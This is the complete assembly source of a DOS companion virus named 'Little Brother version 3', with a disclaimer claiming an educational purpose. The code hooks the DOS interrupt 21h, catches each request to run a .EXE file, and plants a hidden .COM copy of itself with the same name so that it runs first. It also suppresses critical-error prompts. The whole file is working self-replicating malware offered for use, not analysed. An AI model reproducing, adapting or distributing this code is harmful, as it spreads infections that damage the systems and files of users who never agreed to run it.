;****************************************************************************
;*  Little Brother    version 3
;*
;*  Compile with MASM 4.0
;*  (other assemblers will probably not produce the same result)
;*
;*  Disclaimer:
;*  This file is only for educational purposes. The author takes no
;*  responsibility for anything anyone does with this file. Do not
;*  modify this file!
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing

                .RADIX  16

FILELEN         equ     end - begin
oi21            equ     end
nameptr         equ     end+4


;****************************************************************************
;*              Install the program!
;****************************************************************************

                org     100h

begin:          cld
                mov     sp,300

                mov     ax,0044h                ;move program to empty hole
                mov     es,ax
                mov     di,0100h
                mov     si,di
                mov     cx,FILELEN
        rep     movsb

                mov     ds,cx                   ;get original int21 vector
                mov     si,0084h
                mov     di,offset oi21
                mov     dx,offset ni21
                lodsw
                cmp     ax,dx                   ;already installed?
                je      cancel
                stosw
                movsw

                push    es                      ;set vector to new handler
                pop     ds
                mov     ax,2521h
                int     21h

cancel:         push    cs                      ;restore segment registers
                pop     ds
                push    cs
                pop     es

                mov     bx,30                   ;free memory
                mov     ah,4A
                int     21

                mov     es,ds:[002C]            ;search filename in environment
                mov     di,0
                mov     ch,0FFh
                mov     al,01
        repnz   scasb
                inc     di

                mov     word ptr [nameptr],di
                mov     word ptr [nameptr+2],es
                
                mov     si,offset EXE_txt       ;change extension to .EXE
                call    change_ext

                push    cs
                pop     es
                mov     bx,offset param         ;make EXEC param. block
                mov     [bx+4],cs
                mov     [bx+8],cs
                mov     [bx+0C],cs
                lds     dx,dword ptr [nameptr]
                mov     ax,4B00                 ;execute .EXE program
                int     21
                mov     ah,4Dh                  ;ask return code
                int     21
                mov     ah,4Ch                  ;exit with same return code
                int     21


;****************************************************************************
;*              EXEC parameter block
;****************************************************************************

param           dw      0, 80, ?, 5C, ?, 6C, ?


;****************************************************************************
;*              File-extensions
;****************************************************************************

EXE_txt         db      'EXE',0
COM_txt         db      'COM',0


;****************************************************************************
;*              Interupt handler 24
;****************************************************************************

ni24:           mov     al,03
                iret


;****************************************************************************
;*              Interupt handler 21
;****************************************************************************

ni21:           pushf
                push    dx
                push    bx
                push    ax
                push    ds
                push    es

                cmp     ax,4B00h                ;execute ?
                jne     exit

doit:           call    infect

exit:           pop     es
                pop     ds
                pop     ax
                pop     bx
                pop     dx
                popf

                jmp     dword ptr cs:[oi21]     ;call to old int-handler


;****************************************************************************
;*              Tries to infect the file (ptr to ASCIIZ-name is DS:DX)
;****************************************************************************

infect:         cld

                mov     word ptr cs:[nameptr],dx  ;save the ptr to the filename
                mov     word ptr cs:[nameptr+2],ds

                push    cs
                pop     ds
                call    searchpoint
                mov     si,offset EXE_txt       ;is extension 'EXE'?
                mov     cx,3
        rep     cmpsb
                jnz     return

                mov     si,offset COM_txt       ;change extension to COM
                call    change_ext

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                cwd                             ;clear the flag
                inc     ax
                push    ax
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                push    cs                      ;set int24 vec to new handler
                pop     ds
                mov     dx,offset ni24
                mov     ah,25h
                push    ax
                int     21

                lds     dx,dword ptr [nameptr]  ;create the virus (unique name)
                xor     cx,cx
                mov     ah,5Bh
                int     21
                jc      return1                 
                xchg    bx,ax                   ;save handle

                push    cs
                pop     ds
                mov     cx,FILELEN              ;write the virus
                mov     dx,offset begin
                mov     ah,40h
                int     21
                cmp     ax,cx
                pushf

                mov     ah,3Eh                  ;close the file
                int     21

                popf
                jz      return1                 ;all bytes written?

                lds     dx,dword ptr [nameptr]  ;no, delete the virus
                mov     ah,41h
                int     21

return1:        pop     ax                      ;restore int24 vector
                pop     ds
                pop     dx
                int     21

                pop     ax                      ;restore ctrl-break flag
                pop     dx
                int     21

                mov     si,offset EXE_txt       ;change extension to EXE
                call    change_ext              ;execute .EXE program

return:         ret


;****************************************************************************
;*              change the extension of the filename (CS:SI -> ext)
;****************************************************************************

change_ext:     call    searchpoint
                push    cs
                pop     ds
                movsw
                movsw
                ret


;****************************************************************************
;*              search begin of extension  
;****************************************************************************

searchpoint:    les     di,dword ptr cs:[nameptr]
                mov     ch,0FFh
                mov     al,0
        repnz   scasb
                sub     di,4
                ret


;****************************************************************************
;*              Text and Signature
;****************************************************************************

                db      'Little Brother',0

end:

cseg            ends
                end     begin

